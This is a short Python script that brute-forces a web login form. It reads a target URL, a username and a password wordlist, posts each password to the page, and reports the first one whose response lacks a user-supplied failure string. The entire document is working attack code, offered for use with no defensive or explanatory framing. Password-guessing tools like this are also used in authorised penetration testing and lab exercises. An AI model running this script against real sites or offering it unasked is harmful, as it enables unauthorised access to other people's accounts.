import requests

url = input('[+] Enter Page Url: ')
username = input('[+] Enter Username For The Account To BruteForce: ')
password_file = input('[+] Enter The Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

def cracking(username, url):
	for password in passwords:
		password = password.strip()
		print(f'trying this password: {password}')
		data = {
			'username': username,
			'password': password,
			'Login': 'submit'
			}
		response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(f'[+] Found Username ==> {username}')
			print(f'[+] Found Password ==> {password}')
			exit()
with open(password_file, 'r') as passwords:
	cracking(username, url)

print('Password Not In List!!!')
